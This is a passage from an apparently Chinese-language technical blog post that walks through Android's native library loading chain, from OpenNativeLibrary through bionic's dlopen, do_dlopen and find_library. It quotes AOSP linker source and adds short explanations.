class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /system/core/libnativeloader/native_loader.cpp</span></span><br><span class="line"><span class="number">523</span>  <span class="type">void</span>* <span class="title function_">OpenNativeLibrary</span><span class="params">(JNIEnv* env,</span></span><br><span class="line"><span class="params"><span class="number">524</span>                          <span class="type">int32_t</span> target_sdk_version,</span></span><br><span class="line"><span class="params"><span class="number">525</span>                          <span class="type">const</span> <span class="type">char</span>* path,</span></span><br><span class="line"><span class="params"><span class="number">526</span>                          jobject class_loader,</span></span><br><span class="line"><span class="params"><span class="number">527</span>                          jstring library_path,</span></span><br><span class="line"><span class="params"><span class="number">528</span>                          <span class="type">bool</span>* needs_native_bridge,</span></span><br><span class="line"><span class="params"><span class="number">529</span>                          <span class="built_in">std</span>::<span class="built_in">string</span>* error_msg)</span> &#123;</span><br><span class="line"><span class="number">530</span>  <span class="meta">#<span class="keyword">if</span> defined(__ANDROID__)</span></span><br><span class="line"><span class="number">531</span>    UNUSED(target_sdk_version);</span><br><span class="line"><span class="number">532</span>    <span class="keyword">if</span> (class_loader == nullptr) &#123;</span><br><span class="line"><span class="number">533</span>      *needs_native_bridge = <span class="literal">false</span>;</span><br><span class="line"><span class="number">534</span>      <span class="keyword">return</span> dlopen(path, RTLD_NOW);</span><br><span class="line"><span class="number">535</span>    &#125;</span><br><span class="line"><span class="number">536</span>  </span><br><span class="line"><span class="number">537</span>    <span class="built_in">std</span>::lock_guard&lt;<span class="built_in">std</span>::mutex&gt; <span class="title function_">guard</span><span class="params">(g_namespaces_mutex)</span>;</span><br><span class="line"><span class="number">538</span>    NativeLoaderNamespace ns;</span><br><span class="line"><span class="number">539</span>  </span><br><span class="line"><span class="number">540</span>    <span class="keyword">if</span> (!g_namespaces-&gt;FindNamespaceByClassLoader(env, class_loader, &amp;ns)) &#123;</span><br><span class="line"><span class="number">541</span>      <span class="comment">// This is the case where the classloader was not created by ApplicationLoaders</span></span><br><span class="line"><span class="number">542</span>      <span class="comment">// In this case we create an isolated not-shared namespace for it.</span></span><br><span class="line"><span class="number">543</span>      <span class="keyword">if</span> (!g_namespaces-&gt;Create(env,</span><br><span class="line"><span class="number">544</span>                                target_sdk_version,</span><br><span class="line"><span class="number">545</span>                                class_loader,</span><br><span class="line"><span class="number">546</span>                                <span class="literal">false</span> <span class="comment">/* is_shared */</span>,</span><br><span class="line"><span class="number">547</span>                                <span class="literal">false</span> <span class="comment">/* is_for_vendor */</span>,</span><br><span class="line"><span class="number">548</span>                                library_path,</span><br><span class="line"><span class="number">549</span>                                nullptr,</span><br><span class="line"><span class="number">550</span>                                &amp;ns,</span><br><span class="line"><span class="number">551</span>                                error_msg)) &#123;</span><br><span class="line"><span class="number">552</span>        <span class="keyword">return</span> nullptr;</span><br><span class="line"><span class="number">553</span>      &#125;</span><br><span class="line"><span class="number">554</span>    &#125;</span><br><span class="line"><span class="number">555</span>  </span><br><span class="line"><span class="number">556</span>    <span class="keyword">if</span> (ns.is_android_namespace()) &#123;</span><br><span class="line"><span class="number">557</span>      android_dlextinfo extinfo;</span><br><span class="line"><span class="number">558</span>      extinfo.flags = ANDROID_DLEXT_USE_NAMESPACE;</span><br><span class="line"><span class="number">559</span>      extinfo.library_namespace = ns.get_android_ns();</span><br><span class="line"><span class="number">560</span>  </span><br><span class="line"><span class="number">561</span>      <span class="type">void</span>* handle = android_dlopen_ext(path, RTLD_NOW, &amp;extinfo);</span><br><span class="line"><span class="number">562</span>      <span class="keyword">if</span> (handle == nullptr) &#123;</span><br><span class="line"><span class="number">563</span>        *error_msg = dlerror();</span><br><span class="line"><span class="number">564</span>      &#125;</span><br><span class="line"><span class="number">565</span>      *needs_native_bridge = <span class="literal">false</span>;</span><br><span class="line"><span class="number">566</span>      <span class="keyword">return</span> handle;</span><br><span class="line"><span class="number">567</span>    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">568</span>      <span class="type">void</span>* handle = NativeBridgeLoadLibraryExt(path, RTLD_NOW, ns.get_native_bridge_ns());</span><br><span class="line"><span class="number">569</span>      <span class="keyword">if</span> (handle == nullptr) &#123;</span><br><span class="line"><span class="number">570</span>        *error_msg = NativeBridgeGetError();</span><br><span class="line"><span class="number">571</span>      &#125;</span><br><span class="line"><span class="number">572</span>      *needs_native_bridge = <span class="literal">true</span>;</span><br><span class="line"><span class="number">573</span>      <span class="keyword">return</span> handle;</span><br><span class="line"><span class="number">574</span>    &#125;</span><br><span class="line"><span class="number">575</span>  <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="number">576</span>    UNUSED(env, target_sdk_version, class_loader, library_path);</span><br><span class="line"><span class="number">577</span>    *needs_native_bridge = <span class="literal">false</span>;</span><br><span class="line"><span class="number">578</span>    <span class="type">void</span>* handle = dlopen(path, RTLD_NOW);</span><br><span class="line"><span class="number">579</span>    <span class="keyword">if</span> (handle == nullptr) &#123;</span><br><span class="line"><span class="number">580</span>      <span class="keyword">if</span> (NativeBridgeIsSupported(path)) &#123;</span><br><span class="line"><span class="number">581</span>        *needs_native_bridge = <span class="literal">true</span>;</span><br><span class="line"><span class="number">582</span>        handle = NativeBridgeLoadLibrary(path, RTLD_NOW);</span><br><span class="line"><span class="number">583</span>        <span class="keyword">if</span> (handle == nullptr) &#123;</span><br><span class="line"><span class="number">584</span>          *error_msg = NativeBridgeGetError();</span><br><span class="line"><span class="number">585</span>        &#125;</span><br><span class="line"><span class="number">586</span>      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">587</span>        *needs_native_bridge = <span class="literal">false</span>;</span><br><span class="line"><span class="number">588</span>        *error_msg = dlerror();</span><br><span class="line"><span class="number">589</span>      &#125;</span><br><span class="line"><span class="number">590</span>    &#125;</span><br><span class="line"><span class="number">591</span>    <span class="keyword">return</span> handle;</span><br><span class="line"><span class="number">592</span>  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="number">593</span>  &#125;</span><br></pre></td></tr></table></figure><p>这个函数无论怎样都会调用<code>dlopen()</code>函数。</p><h2 id="2-5-dlopen"><a href="#2-5-dlopen" class="headerlink" title="2.5 dlopen()"></a>2.5 dlopen()</h2><p>我们选择的是bionic目录下的<code>dlopen()</code>，是因为在 bionic目录下都属于Android的内核源码，是比较关键的地方。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/libdl/libdl.c</span></span><br><span class="line"><span class="number">101</span>  <span class="type">void</span>* <span class="title function_">dlopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename, <span class="type">int</span> flag)</span> &#123;</span><br><span class="line"><span class="number">102</span>    <span class="type">const</span> <span class="type">void</span>* caller_addr = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line"><span class="number">103</span>    <span class="keyword">return</span> __loader_dlopen(filename, flag, caller_addr);</span><br><span class="line"><span class="number">104</span>  &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">23</span>  <span class="comment">// These functions are exported by the loader</span></span><br><span class="line"><span class="number">24</span>  <span class="comment">// TODO(dimitry): replace these with reference to libc.so</span></span><br><span class="line"><span class="number">25</span>  </span><br><span class="line"><span class="number">26</span>  __attribute__((__weak__, visibility(<span class="string">&quot;default&quot;</span>)))</span><br><span class="line"><span class="number">27</span>  <span class="type">void</span>* __loader_dlopen(<span class="type">const</span> <span class="type">char</span>* filename, <span class="type">int</span> flags, <span class="type">const</span> <span class="type">void</span>* caller_addr);</span><br></pre></td></tr></table></figure><h2 id="2-6-dlopen"><a href="#2-6-dlopen" class="headerlink" title="2.6 __dlopen()"></a>2.6 __dlopen()</h2><p>继续搜索<code>__loader_dlopen</code>，在<code>/bionic/linker/dlfcn.cpp</code>中指向了<code>__dlopen</code>。</p><img src="/posts/203cba03/2.5.1.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">102</span>  <span class="type">void</span>* __dlopen(<span class="type">const</span> <span class="type">char</span>* filename, <span class="type">int</span> flags, <span class="type">const</span> <span class="type">void</span>* caller_addr) &#123;</span><br><span class="line"><span class="number">103</span>    <span class="keyword">return</span> dlopen_ext(filename, flags, nullptr, caller_addr);</span><br><span class="line"><span class="number">104</span>  &#125;</span><br></pre></td></tr></table></figure><h2 id="2-7-dlopen-ext"><a href="#2-7-dlopen-ext" class="headerlink" title="2.7 dlopen_ext()"></a>2.7 dlopen_ext()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/dlfcn.cpp</span></span><br><span class="line"><span class="number">81</span>  <span class="type">static</span> <span class="type">void</span>* <span class="title function_">dlopen_ext</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename,</span></span><br><span class="line"><span class="params"><span class="number">82</span>                          <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params"><span class="number">83</span>                          <span class="type">const</span> android_dlextinfo* extinfo,</span></span><br><span class="line"><span class="params"><span class="number">84</span>                          <span class="type">const</span> <span class="type">void</span>* caller_addr)</span> &#123;</span><br><span class="line"><span class="number">85</span>    ScopedPthreadMutexLocker <span class="title function_">locker</span><span class="params">(&amp;g_dl_mutex)</span>;</span><br><span class="line"><span class="number">86</span>    g_linker_logger.ResetState();</span><br><span class="line"><span class="number">87</span>    <span class="type">void</span>* result = do_dlopen(filename, flags, extinfo, caller_addr);</span><br><span class="line"><span class="number">88</span>    <span class="keyword">if</span> (result == nullptr) &#123;</span><br><span class="line"><span class="number">89</span>      __bionic_format_dlerror(<span class="string">&quot;dlopen failed&quot;</span>, linker_get_error_buffer());</span><br><span class="line"><span class="number">90</span>      <span class="keyword">return</span> nullptr;</span><br><span class="line"><span class="number">91</span>    &#125;</span><br><span class="line"><span class="number">92</span>    <span class="keyword">return</span> result;</span><br><span class="line"><span class="number">93</span>  &#125;</span><br></pre></td></tr></table></figure><h2 id="2-8-do-dlopen"><a href="#2-8-do-dlopen" class="headerlink" title="2.8 do_dlopen()"></a>2.8 do_dlopen()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker.cpp</span></span><br><span class="line"><span class="number">1937</span>  <span class="type">void</span>* <span class="title function_">do_dlopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* name, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params"><span class="number">1938</span>                  <span class="type">const</span> android_dlextinfo* extinfo,</span></span><br><span class="line"><span class="params"><span class="number">1939</span>                  <span class="type">const</span> <span class="type">void</span>* caller_addr)</span> &#123;</span><br><span class="line"><span class="number">1940</span>    <span class="built_in">std</span>::<span class="built_in">string</span> trace_prefix = <span class="built_in">std</span>::<span class="built_in">string</span>(<span class="string">&quot;dlopen: &quot;</span>) + (name == nullptr ? <span class="string">&quot;(nullptr)&quot;</span> : name);</span><br><span class="line"><span class="number">1941</span>    ScopedTrace <span class="title function_">trace</span><span class="params">(trace_prefix.c_str())</span>;</span><br><span class="line"><span class="number">1942</span>    ScopedTrace <span class="title function_">loading_trace</span><span class="params">((trace_prefix + <span class="string">&quot; - loading and linking&quot;</span>).c_str())</span>;</span><br><span class="line"><span class="number">1943</span>    soinfo* <span class="type">const</span> caller = find_containing_library(caller_addr);</span><br><span class="line"><span class="number">1944</span>    <span class="type">android_namespace_t</span>* ns = get_caller_namespace(caller);</span><br><span class="line">...</span><br><span class="line"><span class="number">2012</span>    ProtectedDataGuard guard;</span><br><span class="line"><span class="number">2013</span>    soinfo* si = find_library(ns, translated_name, flags, extinfo, caller);</span><br><span class="line"><span class="number">2014</span>    loading_trace.End();</span><br><span class="line"><span class="number">2015</span>  </span><br><span class="line"><span class="number">2016</span>    <span class="keyword">if</span> (si != nullptr) &#123;</span><br><span class="line"><span class="number">2017</span>      <span class="type">void</span>* handle = si-&gt;to_handle();</span><br><span class="line"><span class="number">2018</span>      LD_LOG(kLogDlopen,</span><br><span class="line"><span class="number">2019</span>             <span class="string">&quot;... dlopen calling constructors: realpath=\&quot;%s\&quot;, soname=\&quot;%s\&quot;, handle=%p&quot;</span>,</span><br><span class="line"><span class="number">2020</span>             si-&gt;get_realpath(), si-&gt;get_soname(), handle);</span><br><span class="line"><span class="number">2021</span>      si-&gt;call_constructors();</span><br><span class="line"><span class="number">2022</span>      failure_guard.Disable();</span><br><span class="line"><span class="number">2023</span>      LD_LOG(kLogDlopen,</span><br><span class="line"><span class="number">2024</span>             <span class="string">&quot;... dlopen successful: realpath=\&quot;%s\&quot;, soname=\&quot;%s\&quot;, handle=%p&quot;</span>,</span><br><span class="line"><span class="number">2025</span>             si-&gt;get_realpath(), si-&gt;get_soname(), handle);</span><br><span class="line"><span class="number">2026</span>      <span class="keyword">return</span> handle;</span><br><span class="line"><span class="number">2027</span>    &#125;</span><br><span class="line"><span class="number">2028</span>  </span><br><span class="line"><span class="number">2029</span>    <span class="keyword">return</span> nullptr;</span><br><span class="line"><span class="number">2030</span>  &#125;</span><br></pre></td></tr></table></figure><h2 id="2-9-find-library"><a href="#2-9-find-library" class="headerlink" title="2.9 find_library()"></a>2.9 find_library()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker.cpp</span></span><br><span class="line"><span class="number">1714</span>  <span class="type">static</span> soinfo* <span class="title function_">find_library</span><span class="params">(<span class="type">android_namespace_t</span>* ns,</span></span><br><span class="line"><span class="params"><span class="number">1715</span>                              <span class="type">const</span> <span class="type">char</span>* name, <span class="type">int</span> rtld_flags,</span></span><br><span class="line"><span class="params"><span class="number">1716</span>                              <span class="type">const</span> android_dlextinfo* extinfo,</span></span><br><span class="line"><span class="params"><span class="number">1717</span>                              soinfo* needed_by)</span> &#123;</span><br><span class="line"><span class="number">1718</span>    soinfo* si;</span><br><span class="line"><span class="number">1719</span>  </span><br><span class="line"><span class="number">1720</span>    <span class="comment">// readers_map is shared across recursive calls to find_libraries.</span></span><br><span class="line"><span class="number">1721</span>    <span class="comment">// However, the map is not shared across different threads.</span></span><br><span class="line"><span class="number">1722</span>    <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="type">const</span> soinfo*, ElfReader&gt; readers_map;</span><br><span class="line"><span class="number">1723</span>    <span class="keyword">if</span> (name == nullptr) &#123;</span><br><span class="line"><span class="number">1724</span>      si = solist_get_somain();</span><br><span class="line"><span class="number">1725</span>    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!find_libraries(ns,</span><br><span class="line"><span class="number">1726</span>                               needed_by,</span><br><span class="line"><span class="number">1727</span>                               &amp;name,</span><br><span class="line"><span class="number">1728</span>                               <span class="number">1</span>,</span><br><span class="line"><span class="number">1729</span>                               &amp;si,</span><br><span class="line"><span class="number">1730</span>                               nullptr,</span><br><span class="line"><span class="number">1731</span>                               <span class="number">0</span>,</span><br><span class="line"><span class="number">1732</span>                               rtld_flags,</span><br><span class="line"><span class="number">1733</span>                               extinfo,</span><br><span class="line"><span class="number">1734</span>                               <span class="literal">false</span> <span class="comment">/* add_as_children */</span>,</span><br><span class="line"><span class="number">1735</span>                               <span class="literal">true</span> <span class="comment">/* search_linked_namespaces */</span>,</span><br><span class="line"><span class="number">1736</span>                               readers_map)) &#123;</span><br><span class="line"><span class="number">1737</span>      <span class="keyword">return</span> nullptr;</span><br><span class="line"><span class="number">1738</span>    &#125;</span><br><span class="line"><span class="number">1739</span>  </span><br><span class="line"><span class="number">1740</span>    si-&gt;increment_ref_count();</span><br><span class="line"><span class="number">1741</span>  </span><br><span class="line"><span class="number">1742</span>    <span class="keyword">return</span> si;</span><br><span class="line"><span class="number">1743</span>  &#125;</span><br></pre></td></tr></table></figure><h2 id="2-10-find-libraries"><a href="#2-10-find-libraries" class="headerlink" title="2.10 find_libraries()"></a>2.10 find_libraries()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker.cpp</span></span><br><span class="line"><span class="number">1497</span>  <span class="type">bool</span> <span class="title function_">find_libraries</span><span class="params">(<span class="type">android_namespace_t</span>* ns,</span></span><br><span class="line"><span class="params"><span class="number">1498</span>                      soinfo* start_with,</span></span><br><span class="line"><span class="params"><span class="number">1499</span>                      <span class="type">const</span> <span class="type">char</span>* <span class="type">const</span> library_names[],</span></span><br><span class="line"><span class="params"><span class="number">1500</span>                      <span class="type">size_t</span> library_names_count,</span></span><br><span class="line"><span class="params"><span class="number">1501</span>                      soinfo* soinfos[],</span></span><br><span class="line"><span class="params"><span class="number">1502</span>                      <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;soinfo*&gt;* ld_preloads,</span></span><br><span class="line"><span class="params"><span class="number">1503</span>                      <span class="type">size_t</span> ld_preloads_count,</span></span><br><span class="line"><span class="params"><span class="number">1504</span>                      <span class="type">int</span> rtld_flags,</span></span><br><span class="line"><span class="params"><span class="number">1505</span>                      <span class="type">const</span> android_dlextinfo* extinfo,</span></span><br><span class="line"><span class="params"><span class="number">1506</span>                      <span class="type">bool</span> add_as_children,</span></span><br><span class="line"><span class="params"><span class="number">1507</span>                      <span class="type">bool</span> search_linked_namespaces,</span></span><br><span class="line"><span class="params"><span class="number">1508</span>                      <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="type">const</span> soinfo*, ElfReader&gt;&amp; readers_map,</span></span><br><span class="line"><span class="params"><span class="number">1509</span>                      <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">android_namespace_t</span>*&gt;* namespaces)</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">1557</span>      <span class="comment">// try to find the load.</span></span><br><span class="line"><span class="number">1558</span>      <span class="comment">// Note: start from the namespace that is stored in the LoadTask. This namespace</span></span><br><span class="line"><span class="number">1559</span>      <span class="comment">// is different from the current namespace when the LoadTask is for a transitive</span></span><br><span class="line"><span class="number">1560</span>      <span class="comment">// dependency and the lib that created the LoadTask is not found in the</span></span><br><span class="line"><span class="number">1561</span>      <span class="comment">// current namespace but in one of the linked namespace.</span></span><br><span class="line"><span class="number">1562</span>      <span class="keyword">if</span> (!find_library_internal(const_cast&lt;<span class="type">android_namespace_t</span>*&gt;(task-&gt;get_start_from()),</span><br><span class="line"><span class="number">1563</span>                                 task,</span><br><span class="line"><span class="number">1564</span>                                 &amp;zip_archive_cache,</span><br><span class="line"><span class="number">1565</span>                                 &amp;load_tasks,</span><br><span class="line"><span class="number">1566</span>                                 rtld_flags,</span><br><span class="line"><span class="number">1567</span>                                 search_linked_namespaces || is_dt_needed)) &#123;</span><br><span class="line"><span class="number">1568</span>        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">1569</span>      &#125;</span><br><span class="line">...</span><br><span class="line"><span class="number">1592</span>    <span class="comment">// Step 2: Load libraries in random order (see b/24047022)</span></span><br><span class="line"><span class="number">1593</span>    LoadTaskList load_list;</span><br><span class="line"><span class="number">1594</span>    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp;&amp; task : load_tasks) &#123;</span><br><span class="line"><span class="number">1595</span>      soinfo* si = task-&gt;get_soinfo();</span><br><span class="line"><span class="number">1596</span>      <span class="keyword">auto</span> pred = [&amp;](<span class="type">const</span> LoadTask* t) &#123;</span><br><span class="line"><span class="number">1597</span>        <span class="keyword">return</span> t-&gt;get_soinfo() == si;</span><br><span class="line"><span class="number">1598</span>      &#125;;</span><br><span class="line"><span class="number">1599</span>  </span><br><span class="line"><span class="number">1600</span>      <span class="keyword">if</span> (!si-&gt;is_linked() &amp;&amp;</span><br><span class="line"><span class="number">1601</span>          <span class="built_in">std</span>::find_if(load_list.begin(), load_list.end(), pred) == load_list.end() ) &#123;</span><br><span class="line"><span class="number">1602</span>        load_list.push_back(task);</span><br><span class="line"><span class="number">1603</span>      &#125;</span><br><span class="line"><span class="number">1604</span>    &#125;</span><br><span class="line"><span class="number">1605</span>    shuffle(&amp;load_list);</span><br><span class="line"><span class="number">1606</span>  </span><br><span class="line"><span class="number">1607</span>    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp;&amp; task : load_list) &#123;</span><br><span class="line"><span class="number">1608</span>      <span class="keyword">if</span> (!task-&gt;load()) &#123;</span><br><span class="line"><span class="number">1609</span>        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">1610</span>      &#125;</span><br><span class="line"><span class="number">1611</span>    &#125;</span><br><span class="line"><span class="number">1612</span>  </span><br><span class="line"><span class="number">1613</span>    <span class="comment">// Step 3: pre-link all DT_NEEDED libraries in breadth first order.</span></span><br><span class="line"><span class="number">1614</span>    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp;&amp; task : load_tasks) &#123;</span><br><span class="line"><span class="number">1615</span>      soinfo* si = task-&gt;get_soinfo();</span><br><span class="line"><span class="number">1616</span>      <span class="keyword">if</span> (!si-&gt;is_linked() &amp;&amp; !si-&gt;prelink_image()) &#123;</span><br><span class="line"><span class="number">1617</span>        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">1618</span>      &#125;</span><br><span class="line"><span class="number">1619</span>    &#125;</span><br><span class="line">...</span><br><span class="line"><span class="number">1689</span>    <span class="type">soinfo_list_t</span> global_group = ns-&gt;get_global_group();</span><br><span class="line"><span class="number">1690</span>    <span class="type">bool</span> linked = local_group.visit([&amp;](soinfo* si) &#123;</span><br><span class="line"><span class="number">1691</span>      <span class="keyword">if</span> (!si-&gt;is_linked()) &#123;</span><br><span class="line"><span class="number">1692</span>        <span class="keyword">if</span> (!si-&gt;link_image(global_group, local_group, extinfo) ||</span><br><span class="line"><span class="number">1693</span>            !get_cfi_shadow()-&gt;AfterLoad(si, solist_get_head())) &#123;</span><br><span class="line"><span class="number">1694</span>          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">1695</span>        &#125;</span><br><span class="line"><span class="number">1696</span>      &#125;</span><br><span class="line"><span class="number">1697</span>  </span><br><span class="line"><span class="number">1698</span>      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="number">1699</span>    &#125;);</span><br><span class="line"><span class="number">1700</span>  </span><br><span class="line">...</span><br><span class="line"><span class="number">1689</span>    <span class="type">soinfo_list_t</span> global_group = ns-&gt;get_global_group();</span><br><span class="line"><span class="number">1690</span>    <span class="type">bool</span> linked = local_group.visit([&amp;](soinfo* si) &#123;</span><br><span class="line"><span class="number">1691</span>      <span class="keyword">if</span> (!si-&gt;is_linked()) &#123;</span><br><span class="line"><span class="number">1692</span>        <span class="keyword">if</span> (!si-&gt;link_image(global_group, local_group, extinfo) ||</span><br><span class="line"><span class="number">1693</span>            !get_cfi_shadow()-&gt;AfterLoad(si, solist_get_head())) &#123;</span><br><span class="line"><span class="number">1694</span>          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">1695</span>        &#125;</span><br><span class="line"><span class="number">1696</span>      &#125;</span><br><span class="line">...</span><br><span class="line"><span class="number">1712</span>  &#125;</span><br></pre></td></tr></table></figure><h2 id="2-11-find-library-internal"><a href="#2-11-find-library-internal" class="headerlink" title="2.11 find_library_internal()"></a>2.11 find_library_internal()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /bionic/linker/linker.cpp</span></span><br><span class="line"><span class="number">1431</span>  <span class="type">static</span> <span class="type">bool</span> <span class="title function_">find_library_internal</span><span class="params">(<span class="type">android_namespace_t</span>* ns,</span></span><br><span class="line"><span class="params"><span class="number">1432</span>                                    LoadTask* task,</span></span><br><span class="line"><span class="params"><span class="number">1433</span>                                    ZipArchiveCache* zip_archive_cache,</span></span><br><span class="line"><span class="params"><span class="number">1434</span>                                    LoadTaskList* load_tasks,</span></span><br><span class="line"><span class="params"><span class="number">1435</span>                                    <span class="type">int</span> rtld_flags,</span></span><br><span class="line"><span class="params"><span class="number">1436</span>                                    <span class="type">bool</span> search_linked_namespaces)</span> &#123;</span><br><span class="line"><span class="number">1437</span>    soinfo* candidate;</span><br><span class="line"><span class="number">1438</span>  </span><br><span class="line"><span class="number">1439</span>    <span class="keyword">if</span> (find_loaded_library_by_soname(ns, task-&gt;get_name(), search_linked_namespaces, &amp;candidate)) &#123;<span class="comment">//根据so的名称查找在soInfo的链表中查找是否已经存在</span></span><br><span class="line"><span class="number">1440</span>      